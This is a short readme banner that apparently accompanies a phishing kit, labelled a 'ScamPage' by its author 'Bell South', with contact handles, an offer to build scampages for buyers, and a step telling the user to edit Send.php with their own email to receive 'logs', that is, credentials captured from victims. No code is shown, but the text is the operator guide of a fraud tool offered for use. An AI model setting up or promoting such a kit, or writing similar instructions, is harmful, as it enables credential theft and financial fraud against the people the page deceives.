
//--------------------------||-||--------------------------//
             #===============================#
             #         By Bell South         #
             #         Icq: @Bell_South      #
             #       Telegram: @Bell_South   #
			 #       Bellsouth@yahoo.com     #
			 #        fb.com/bell.south      #
			 #         -Contact Me Here-     #
             #===============================#                     
	        ScamPage Developed And Coded By Bell South
		   Copyright 2021---All rights Reserved!
	If You see any problem in this page, Contact me!
		   Want To Build Scampage? Contact Me!!
//--------------------------||-||--------------------------//
*Instructions-
  Send.php > Change your Email to Get Logs



!Important!
  Don't Touch any Code If you don't know about it very well OtherWise Page Will Die..

./Thanks
../Bell South
